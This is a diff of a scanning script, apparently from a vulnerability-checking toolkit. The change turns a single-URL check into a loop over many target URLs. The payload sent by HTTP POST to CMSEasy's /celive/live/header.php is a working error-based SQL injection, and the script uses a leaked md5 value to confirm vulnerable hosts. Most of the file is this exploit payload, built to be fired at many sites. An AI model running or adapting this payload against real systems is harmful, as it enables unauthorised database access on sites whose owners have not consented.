@@ -1,12 +1,23 @@
-#request url = var
+#request urls = array
 #define payload = /celive/live/header.php
 
 
 function main(args)
 {
-	res = HttpPost(url.payload,"xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx'AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT (ELT(1=1,md5(1234)))),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)AND'1'='1</q></xjxquery>","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
-	if(StrFindStr(res[0],"81dc9bdb52d04dc20036dbd8313ed055",0)!= "-1")
-	{
-		print(url."存在cmseasy header.php 报错注入漏洞");
+	printclolor("当前正在检测:"."存在cmseasy header.php 报错注入漏洞",1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			res = HttpPost(url.payload,"xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx'AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT (ELT(1=1,md5(1234)))),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)AND'1'='1</q></xjxquery>","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[0],"81dc9bdb52d04dc20036dbd8313ed055",0)!= "-1")
+			{
+				printclolor("[+]".urls[i]."存在cmseasy header.php 报错注入漏洞",3);
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
 	}
+	
 }
